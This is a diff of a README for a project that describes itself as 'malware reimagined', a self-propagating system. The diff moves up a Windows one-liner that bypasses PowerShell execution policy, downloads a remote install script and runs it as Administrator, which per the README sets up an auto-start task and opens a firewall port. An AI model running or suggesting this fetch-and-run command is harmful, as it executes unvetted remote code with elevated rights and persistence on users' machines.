@@ -84,10 +84,31 @@ This is malware reimagined: a self-propagating system that improves every device
 
 ## 🚀 Quick Start
 
-### Prerequisites
+### Windows Installation (Zero Prerequisites!)
+
+**Run as Administrator** - No Python needed, everything is bundled:
+
+```powershell
+# One-liner standalone install (includes Python!)
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-WebRequest -Uri "https://r0s.org/benevolent-protocol-install.ps1" -OutFile "install.ps1"; .\install.ps1
+```
+
+This will:
+- Download embedded Python 3.12 (no system install needed)
+- Download and install the protocol
+- Install all dependencies in isolated environment
+- Create scheduled task for auto-start
+- Configure Windows Firewall (port 9527)
+- Generate secure configuration with secret key
+- Create desktop shortcut and helper scripts
+
+### Alternative: Manual Install (Requires Python)
+
+<details>
+<summary>Click to expand manual installation</summary>
 
 ```bash
-# Python 3.10+
+# Python 3.10+ required
 python --version
 
 # Clone repository
@@ -98,20 +119,7 @@ cd benevolent_protocol
 pip install -r requirements.txt
 ```
 
-### Windows Installation (PowerShell)
-
-Run as Administrator:
-
-```powershell
-# Quick install (one-liner)
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-WebRequest -Uri "https://r0s.org/benevolent-protocol-install.ps1" -OutFile "install.ps1"; .\install.ps1
-```
-
-This will:
-- Download and install the protocol
-- Create a scheduled task for auto-start
-- Configure Windows Firewall
-- Generate secure configuration
+</details>
 
 ### Basic Usage
 
